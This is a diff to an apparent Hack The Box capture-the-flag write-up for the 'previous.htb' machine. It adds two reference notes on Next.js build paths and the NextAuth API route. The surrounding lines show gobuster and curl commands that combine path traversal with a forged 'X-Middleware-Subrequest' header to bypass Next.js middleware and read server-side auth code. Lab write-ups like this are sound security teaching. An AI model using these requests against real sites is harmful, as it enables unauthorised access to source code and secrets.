@@ -554,6 +554,8 @@ Starting gobuster in directory enumeration mode
 
 Got 2 dir, we will go with `/server`.
 
+> *We can also got these path from [Next.js build API](https://nextjs.org/docs/13/app/building-your-application/deploying#nextjs-build-api)*
+
 ```bash
 └─$ gobuster dir -u "http://previous.htb/api/download?example=../../../app/.next/server/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
 ===============================================================
@@ -596,6 +598,8 @@ Starting gobuster in directory enumeration mode
 ```
 
 So we are there, `/api` back to to `/api/auth/[...nextauth].js` that we can see the auth part.
+
+> *For more information, check out [Next-Auth.js API Route](https://next-auth.js.org/getting-started/example#add-api-route)*
 
 ```bash
 └─$ curl -i "http://previous.htb/api/download?example=../../../app/.next/server/pages/api/auth/[...nextauth].js" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
